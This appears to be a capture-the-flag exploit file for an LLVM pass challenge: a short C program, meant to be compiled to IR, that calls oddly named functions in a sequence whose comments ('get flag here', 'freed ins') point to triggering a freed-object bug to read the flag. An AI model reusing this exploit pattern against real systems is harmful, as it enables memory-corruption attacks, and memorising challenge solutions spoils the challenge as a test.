// clang -emit-llvm -S exp.c -o exp.ll
void wher3(int a);
void wr1te(int a, int b);
void re4d(int a);
void p4int(int a);
void g1ft();
void c1ear();
void m41n(int a)
{
   g1ft();
   wher3(0x88); // get flag here
   re4d(0x10);  // 0
   re4d(0x11);  // 1
   re4d(0x12);  // 2
   re4d(0x13);  // 3
   re4d(0x14);  // 4
   re4d(0x15);  // 5
   re4d(0x16);  // 6
   re4d(0x17);  // 7

   if (a == 4)
   {
      wher3(0x78); // freed ins
   }

   wr1te(0x50, 0);
   wr1te(0x51, 1);
   wr1te(0x52, 2);
   wr1te(0x53, 3);
   wr1te(0x54, 4);
   wr1te(0x55, 5);
   wr1te(0x56, 6);
   wr1te(0x57, 7);

   p4int(40);
   return;
}
int main()
{
   int a;
}
